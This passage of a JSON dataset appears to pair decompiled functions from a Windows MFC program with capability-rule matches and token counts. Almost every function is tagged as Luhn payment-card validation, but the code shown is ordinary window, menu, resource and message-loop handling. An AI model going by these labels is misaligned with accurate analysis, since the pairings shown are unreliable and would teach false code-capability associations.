        "decompiled_code": "\nint64_t fcn.140016df8(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    \n    iVar4 = fcn.140016d54(1);\n    if (arg1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.140015944(iVar4 + 0x30, arg1);\n        if (iVar1 == 0) {\n            iVar1 = fcn.140015944(iVar4 + 0x68, arg1);\n            if (iVar1 == 0) {\n                arg1_00 = fcn.140005860(0x140016664);\n                iVar1 = fcn.140018d74(iVar4 + 8);\n                iVar2 = iVar1;\n                if (iVar1 == 0) {\n                    iVar2 = fcn.140005de8();\n                }\n                (**(iVar4 + 0x20))(iVar2);\n                piVar3 = fcn.140015b8c(iVar4 + 0x68, arg1);\n                *piVar3 = iVar1;\n                fcn.140005860(arg1_00);\n                iVar2 = *(iVar4 + 0xa8);\n                *(iVar1 + iVar2) = arg1;\n                if (*(iVar4 + 0xb0) == 2) {\n                    *(iVar1 + 8 + iVar2) = arg1;\n                }\n            }\n            else {\n                iVar2 = *(iVar4 + 0xa8);\n                *(iVar1 + iVar2) = arg1;\n                if (*(iVar4 + 0xb0) == 2) {\n                    *(iVar1 + 8 + iVar2) = arg1;\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 417
    },
    "140008e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.140008e74(code **arg1)\n\n{\n    fcn.14000f818(arg1);\n    *(arg1 + 8) = 1;\n    *arg1 = vtable.CTestCmdUI.0;\n    return arg1;\n}\n",
        "token_count": 59
    },
    "14000987": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.140009874(code **arg1)\n\n{\n    fcn.14000f848(arg1);\n    *arg1 = vtable.CWnd.0;\n    arg1[0xc] = vtable.CWnd::XAccessible.0;\n    arg1[0xd] = vtable.CWnd::XAccessibleServer.0;\n    arg1[8] = NULL;\n    *(arg1 + 9) = 0;\n    arg1[0xb] = NULL;\n    arg1[10] = NULL;\n    arg1[0xe] = NULL;\n    *(arg1 + 0xf) = 0;\n    arg1[0x10] = NULL;\n    *(arg1 + 0x11) = 0;\n    arg1[0x12] = NULL;\n    arg1[0x13] = NULL;\n    arg1[0x14] = NULL;\n    return arg1;\n}\n",
        "token_count": 202
    },
    "1400098e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400098e8(int64_t hWnd, ulong lpRect, uint *arg3)\n\n{\n    uint uVar1;\n    \n    (*_sym.imp.USER32.dll_GetWindowRect)(*(hWnd + 0x40));\n    uVar1 = fcn.140007b34(hWnd);\n    *arg3 = uVar1;\n    return;\n}\n",
        "token_count": 80
    },
    "140009b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140009b38(int64_t hMenu, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    ulong arg1;\n    int32_t iVar5;\n    \n    arg2 = arg2 & 0xffffffff;\n    if (hMenu == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        iVar4 = (*pcVar1)();\n        return iVar4;\n    }\n    iVar2 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(hMenu + 8));\n    iVar5 = 0;\n    if (0 < iVar2) {\n        do {\n            arg1 = (*_sym.imp.USER32.dll_GetSubMenu)(*(hMenu + 8));\n            iVar4 = fcn.140016df8(arg1);\n            if (iVar4 == 0) {\n                iVar3 = (*_sym.imp.USER32.dll_GetMenuItemID)(*(hMenu + 8));\n                if (iVar3 == arg2) goto code_r0x000140009bcb;\n            }\n            else {\n                if (*(iVar4 + 8) == arg2) {\ncode_r0x000140009bcb:\n                    iVar4 = fcn.140016e1c(*(hMenu + 8));\n                    return iVar4;\n                }\n                iVar4 = fcn.140009b38(iVar4, arg2);\n                if (iVar4 != 0) {\n                    return iVar4;\n                }\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 369
    },
    "140009bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140009bd8(code **arg1)\n\n{\n    *arg1 = vtable._AFX_HTMLHELP_STATE.0;\n    if (arg1[1] != NULL) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "14000aae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000aae4(int64_t **arg1)\n\n{\n    if (*arg1 != NULL) {\n        (**(**arg1 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 45
    },
    "14000aaf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.14000aafc(int64_t *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong in_R9;\n    ulong uVar3;\n    uint auStack40 [2];\n    int64_t *piStack32;\n    uint uStack24;\n    \n    uVar3 = 0xfffffffffffffffe;\n    uStack24 = 0;\n    auStack40[0] = arg2;\n    piStack32 = arg1;\n    iVar2 = fcn.140006414();\n    uVar1 = *(iVar2 + 0x138);\n    *(iVar2 + 0x138) = arg1[8];\n    (**(*arg1 + 0x1f8))(arg1, auStack40, *arg1, in_R9, uVar3);\n    *(iVar2 + 0x138) = uVar1;\n    return 1;\n}\n",
        "token_count": 202
    },
    "14000b2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000b2a0(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140015718(0x14004fe50, 0x140005e54);\n    if (iVar2 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00014000b2ea. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(*arg1 + 0x230))(arg1, *(iVar2 + 0xa0), *(iVar2 + 0xa8), *(iVar2 + 0xb0));\n    return;\n}\n",
        "token_count": 181
    },
    "14000b39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000b398(ulong arg1)\n\n{\n    ulong arg1_00;\n    ulong hWnd;\n    \n    arg1_00 = fcn.14000b2f4(1);\n    hWnd = fcn.140016210(arg1_00, arg1);\n    fcn.140007d88(hWnd, arg1_00);\n    return hWnd;\n}\n",
        "token_count": 82
    },
    "14000b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.14000b408(int64_t arg1, int64_t arg2)\n\n{\n    int64_t arg2_00;\n    int64_t *piVar1;\n    \n    if (arg2 != 0) {\n        arg2_00 = fcn.14000b2f4(1);\n        *(arg1 + 0x40) = arg2;\n        piVar1 = fcn.140015b8c(arg2_00 + 0x30, arg2);\n        *piVar1 = arg1;\n        fcn.140007d88(arg1, arg2_00);\n    }\n    return arg2 != 0;\n}\n",
        "token_count": 145
    },
    "14000b7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000b7c4(ulong arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    arg3 = arg3 & 0xffffffff;\n    iVar1 = (*_sym.imp.USER32.dll_GetDlgItem)();\n    if (iVar1 != 0) {\n        iVar2 = (*_sym.imp.USER32.dll_GetTopWindow)(iVar1);\n        if ((iVar2 != 0) && (iVar2 = fcn.14000b7c4(iVar1, arg2 & 0xffffffff, arg3),  iVar2 != 0)) {\n            return iVar2;\n        }\n        if (arg3 == 0) {\n            iVar1 = fcn.14000b398(iVar1);\n            return iVar1;\n        }\n        iVar1 = fcn.14000b3dc(iVar1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n    }\n    iVar1 = (*_sym.imp.USER32.dll_GetTopWindow)(arg1);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.14000b7c4(iVar1, arg2 & 0xffffffff, arg3);\n        if (iVar2 != 0) break;\n        iVar1 = (*_sym.imp.USER32.dll_GetWindow)(iVar1);\n    }\n    return iVar2;\n}\n",
        "token_count": 322
    },
    "14000b87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000b870(int64_t arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    int64_t arg1_00;\n    \n    arg1_00 = *arg2;\n    while( true ) {\n        if (arg1_00 == 0) {\n            return 0;\n        }\n        piVar2 = fcn.14000b3dc(arg1_00);\n        if ((piVar2 != NULL) && (iVar1 = (**(*piVar2 + 0x210))(piVar2, arg2),  iVar1 != 0)) break;\n        if (arg1_00 == arg1) {\n            return 0;\n        }\n        arg1_00 = (*_sym.imp.USER32.dll_GetParent)(arg1_00);\n    }\n    return 1;\n}\n",
        "token_count": 191
    },
    "14000bfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.14000bfcc(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong arg1_00;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    if ((arg1 != 0) && (iVar3 = *(arg1 + 0x40),  iVar3 != 0)) {\n        while( true ) {\n            arg1_00 = (*_sym.imp.USER32.dll_GetParent)(iVar3);\n            piVar2 = fcn.14000b398(arg1_00);\n            if (piVar2 == NULL) break;\n            iVar1 = (**(*piVar2 + 0x250))(piVar2);\n            if (iVar1 != 0) {\n                return piVar2;\n            }\n            iVar3 = piVar2[8];\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 190
    },
    "14000cd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000cd40(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t arg1_00;\n    \n    if ((arg1 == 0) || (iVar1 = *(arg1 + 0x40),  *(arg1 + 0x40) == 0)) {\n        uVar2 = 0;\n    }\n    else {\n        do {\n            arg1_00 = iVar1;\n            iVar1 = fcn.14000ccc8(arg1_00);\n        } while (iVar1 != 0);\n        uVar2 = fcn.14000b398(arg1_00);\n    }\n    return uVar2;\n}\n",
        "token_count": 154
    },
    "14000e9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000e9a8(void)\n\n{\n    int64_t iVar1;\n    uchar auStack616 [64];\n    ulong uStack552;\n    uint64_t uStack24;\n    \n    uStack552 = 0xfffffffffffffffe;\n    uStack24 = *0x14003e1a0 ^ auStack616;\n    iVar1 = fcn.140006c48();\n    fcn.14000f8c4(*(iVar1 + 8));\n    fcn.14001b410(uStack24 ^ auStack616);\n    return;\n}\n",
        "token_count": 123
    },
    "14000eee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000eee4(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    uint64_t arg3_00;\n    uchar auStack104 [56];\n    ulong uStack48;\n    \n    *(arg1 + 0x40) = arg2;\n    uStack48 = 0x14000eefd;\n    iVar5 = fcn.140006c48();\n    uStack48 = 0x14000ef0a;\n    iVar5 = (*_sym.imp.USER32.dll_LoadIconA)(*(iVar5 + 0x18), arg3);\n    *(arg1 + 0x20) = iVar5;\n    if (iVar5 == 0) {\n        uStack48 = 0x14000ef20;\n        uVar6 = (*_sym.imp.USER32.dll_LoadIconA)(0, 0x7f00);\n        *(arg1 + 0x20) = uVar6;\n    }\n    iVar2 = fcn.140009480(*(arg1 + 0x18), *(arg1 + 0x40), &stack0xffffffffffffff98);\n    arg3_00 = 0;\n    if (iVar2 == 0) {\n        iVar1 = fcn.1400093e4(arg1);\n        if (iVar1 == 0) {\n            uVar6 = 0;\n        }\n        else {\n            iVar5 = fcn.140006c48();\n            if (*(iVar5 + 0x28) != '\\0') {\n                fcn.140016f8c(1);\n                iVar4 = fcn.140006c48();\n                iVar5 = *(arg1 + 0x40);\n                if (iVar5 != 0) {\n                    uVar3 = fcn.14001bab0(iVar5);\n                    arg3_00 = uVar3;\n                }\n                fcn.140005bfc(iVar4 + 0x58, iVar5, arg3_00);\n                fcn.140005b7c(iVar4 + 0x58);\n                fcn.140017020(1);\n            }\n            uVar6 = 1;\n        }\n    }\n    else {\n        uVar6 = 1;\n    }\n    return uVar6;\n}\n",
        "token_count": 531
    },
    "14000f33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.14000f338(ulong arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t arg2_00;\n    \n    arg2_00 = 0;\n    iVar4 = 0;\n    if (arg2 != 0) {\n        iVar3 = fcn.140006c48();\n        uVar1 = *(iVar3 + 0x18);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar1, arg2, 0xf0);\n        if (iVar3 != 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar1, iVar3);\n            if (iVar4 == 0) {\n                return 0;\n            }\n            arg2_00 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar4);\n        }\n    }\n    uVar2 = fcn.14000ed50(arg1, arg2_00);\n    if ((arg2_00 != 0) && (iVar4 != 0)) {\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar4);\n    }\n    return uVar2;\n}\n",
        "token_count": 275
    },
    "14000f84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000f848(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.140006c48();\n    *(arg1 + 0x38) = uVar1;\n    *(arg1 + 8) = 1;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x30) = 0;\n    *(arg1 + 0x28) = 1;\n    return arg1;\n}\n",
        "token_count": 141
    },
    "14000f8a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000f8a4(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c48();\n    // WARNING: Could not recover jumptable at 0x00014000f8bd. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(iVar1 + 8) + 0x138))(*(iVar1 + 8), 1);\n    return;\n}\n",
        "token_count": 100
    },
    "14000f8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000f8c4(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c48();\n    // WARNING: Could not recover jumptable at 0x00014000f8db. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(iVar1 + 8) + 0x138))(*(iVar1 + 8), 0xffffffff);\n    return;\n}\n",
        "token_count": 101
    },
    "14000fca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000fca0(uint64_t arg1, uchar *arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ushort *puVar3;\n    ulong uVar4;\n    \n    if ((arg2 == NULL) || (arg3 == 0)) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    iVar2 = fcn.140006c48();\n    uVar4 = *(iVar2 + 0x18);\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar4, ((arg1 & 0xffffffff) >> 4) + 1);\n    if ((iVar2 != 0) && (puVar3 = fcn.140001030(uVar4, iVar2, arg1 & 0xffffffff),  puVar3 != NULL)) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, puVar3 + 1, *puVar3, arg2, arg3 + -1, 0, 0);\n        arg2[uVar4] = 0;\n        return uVar4;\n    }\n    *arg2 = 0;\n    return 0;\n}\n",
        "token_count": 298
    },
    "14000fd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000fd5c(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c48();\n    return *(iVar1 + 0x18);\n}\n",
        "token_count": 45
    },
    "14000fe1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.14000fe14(int64_t *arg1, int64_t arg2, ulong arg3, ulong *arg4)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    uint64_t arg2_00;\n    \n    arg2_00 = arg3;\n    if (arg4 == NULL) {\n        fcn.140001010(0x80004005);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    if ((arg2 == 0) && (arg3 != 0)) {\n        fcn.140001010(0x80070057);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    iVar3 = (***arg4)(arg4, arg2_00 & 0xffffffff, 1);\n    if (iVar3 == 0) {\n        fcn.140001420();\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    *arg1 = iVar3 + 0x18;\n    if ((-1 < arg3) && (arg3 <= *(iVar3 + 0xc))) {\n        *(iVar3 + 8) = arg3;\n        *(arg2_00 + *arg1) = 0;\n        fcn.14001af18(*arg1, arg2_00, arg2, arg2_00);\n        return arg1;\n    }\n    fcn.140001010(0x80070057);\n    pcVar1 = swi(3);\n    piVar2 = (*pcVar1)();\n    return piVar2;\n}\n",
        "token_count": 394
    },
    "1400165f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400165f4(int64_t *arg1)\n\n{\n    code *pcVar1;\n    \n    if (arg1 == NULL) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (*arg1 != 0) {\n        (*_sym.imp.GDI32.dll_DeleteObject)();\n        *arg1 = 0;\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "140010cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.140010cb0(code **arg1, ulong arg2, ulong arg3)\n\n{\n    *arg1 = vtable.CRectTracker.0;\n    fcn.140010414(arg1);\n    (*_sym.imp.USER32.dll_CopyRect)(arg1 + 0xc, arg2);\n    *(arg1 + 1) = arg3;\n    return arg1;\n}\n",
        "token_count": 86
    },
    "1400112c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400112c0(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    iVar4 = arg1;\n    if (arg1 != 0) goto code_r0x000140011325;\n    iVar4 = fcn.140006414();\n    if (*(iVar4 + 0x158) == 0) {\n        piVar5 = fcn.14001276c();\n        if (piVar5 == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = (**(*piVar5 + 0xe8))(piVar5);\n        }\n        if (iVar4 == 0) {\n            iVar4 = 0;\n            iVar6 = iVar4;\n            iVar7 = iVar4;\n            goto joined_r0x000140011353;\n        }\n        iVar4 = *(iVar4 + 0x40);\n    }\n    else {\n        iVar4 = *(*(iVar4 + 0x158) + 0x40);\n    }\n    for (; iVar6 = iVar4,  iVar7 = iVar4,  iVar4 != 0; iVar4 = (*_sym.imp.USER32.dll_GetParent)(iVar4)) {\ncode_r0x000140011325:\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar4, 0xfffffff0);\n        iVar6 = iVar4;\n        iVar7 = iVar4;\n        if ((uVar2 >> 0x1e & 1) == 0) break;\n    }\njoined_r0x000140011353:\n    while (iVar1 = iVar6,  iVar1 != 0) {\n        iVar6 = (*_sym.imp.USER32.dll_GetParent)(iVar1);\n        iVar4 = iVar1;\n    }\n    if ((arg1 == 0) && (iVar7 != 0)) {\n        iVar7 = (*_sym.imp.USER32.dll_GetLastActivePopup)(iVar7);\n    }\n    if (arg2 != NULL) {\n        if (((iVar4 == 0) || (iVar3 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar4),  iVar3 == 0)) || (iVar4 == iVar7))\n        {\n            *arg2 = 0;\n        }\n        else {\n            *arg2 = iVar4;\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar4, 0);\n        }\n    }\n    return iVar7;\n}\n",
        "token_count": 578
    },
    "14001155": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001155c(ulong arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c48();\n    if (*(iVar1 + 8) == NULL) {\n        fcn.1400113cc(0, arg1, arg2 & 0xffffffff, arg3 & 0xffffffff);\n    }\n    else {\n        (**(**(iVar1 + 8) + 0x130))();\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "1400119b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400119bc(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.14001276c();\n    if ((iVar1 != 0) && (*(iVar1 + 0x78) != NULL)) {\n        (**(iVar1 + 0x78))(1, 1);\n    }\n    // WARNING: Could not recover jumptable at 0x0001400119e7. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.USER32.dll_PostQuitMessage)(arg1);\n    return;\n}\n",
        "token_count": 131
    },
    "140011c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140011c38(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    (**(*arg1 + 0xf8))();\n    iVar1 = (**(*arg1 + 0x160))(arg1);\n    arg1[0x1f] = iVar1;\n    if (iVar1 != 0) {\n        iVar2 = fcn.140006c48();\n        *(iVar2 + 0x18) = iVar1;\n        *0x140054680 = arg1[0x1f];\n    }\n    return 1;\n}\n",
        "token_count": 134
    },
    "14001278": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140012780(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006414();\n    return iVar1 + 0x58;\n}\n",
        "token_count": 43
    },
    "1400127c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400127c0(ulong arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140006c98();\n    piVar1 = *(iVar2 + 8);\n    if (piVar1 == NULL) {\n        fcn.140012794(arg1, arg2);\n    }\n    else {\n        (**(*piVar1 + 0xd8))(piVar1, arg1, arg2);\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "14001280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140012808(int64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    *(arg1 + 0x40) = 0;\n    *(arg1 + 0x48) = 0;\n    *(arg1 + 0x58) = 0;\n    *(arg1 + 0x60) = 0;\n    iVar1 = fcn.140006414();\n    *(iVar1 + 0x60) = 0;\n    *(iVar1 + 0x90) = 0;\n    (*_sym.imp.USER32.dll_GetCursorPos)(iVar1 + 0x88);\n    *(arg1 + 0x80) = 0;\n    *(arg1 + 0x78) = 0;\n    *(arg1 + 0x50) = 1;\n    return;\n}\n",
        "token_count": 184
    },
    "140012af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140012afc(ulong arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140006c98();\n    piVar1 = *(iVar2 + 8);\n    if (piVar1 == NULL) {\n        fcn.140012a58(arg1);\n    }\n    else {\n        (**(*piVar1 + 0xb0))(piVar1, arg1);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "140012ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140012ba8(ulong arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140006c98();\n    piVar1 = *(iVar2 + 8);\n    if (piVar1 == NULL) {\n        fcn.140012b30(arg1);\n    }\n    else {\n        (**(*piVar1 + 200))(piVar1, arg1);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "140012c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140012c8c(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    \n    iVar2 = fcn.140006414();\n    uVar3 = (*_sym.imp.USER32.dll_GetMessageA)(iVar2 + 0x58, 0, 0, 0);\n    if (uVar3 != 0) {\n        if (*(iVar2 + 0x60) != 0x36a) {\n            iVar1 = fcn.140012afc(iVar2 + 0x58);\n            if (iVar1 == 0) {\n                (*_sym.imp.USER32.dll_TranslateMessage)(iVar2 + 0x58);\n                (*_sym.imp.USER32.dll_DispatchMessageA)(iVar2 + 0x58);\n            }\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 199
    },
    "140012cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140012cf0(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c98();\n    if (*(iVar1 + 8) == NULL) {\n        fcn.140012c8c();\n    }\n    else {\n        (**(**(iVar1 + 8) + 0xb8))();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "1400139a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400139a8(int64_t *arg1, ulong arg2)\n\n{\n    if ((*(arg1 + 0xf) & 0x18) != 0) {\n        (**(*arg1 + 0x118))(arg1, arg2 & 0xffffffff);\n    }\n    // WARNING: Could not recover jumptable at 0x0001400139da. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.USER32.dll_EndDialog)(arg1[8], arg2);\n    return;\n}\n",
        "token_count": 125
    },
    "140013c7": {
        "rules": [
